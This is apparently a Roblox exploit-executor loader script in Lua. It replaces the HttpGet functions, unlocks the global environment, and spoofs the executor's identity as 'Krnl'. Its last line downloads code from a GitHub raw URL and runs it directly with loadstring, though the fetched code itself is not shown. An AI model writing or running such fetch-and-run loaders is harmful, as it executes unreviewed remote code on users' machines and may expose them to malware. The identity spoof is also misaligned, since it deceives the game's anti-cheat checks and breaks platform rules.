local env = getgenv()
local safeHttpGet = function(...)
    local args = {...}
    local url = ""
    for _, v in ipairs(args) do
        if type(v) == "string" and (v:sub(1,4) == "http" or v:find("://")) then
            url = v
            break
        end
    end
    if url ~= "" then
        return game:HttpGet(url)
    end
end

env.httpget = safeHttpGet
env.HttpGet = safeHttpGet

if setreadonly then setreadonly(env, false) end
env.identifyexecutor = function() return "Krnl" end loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/Tokra.txt"))()
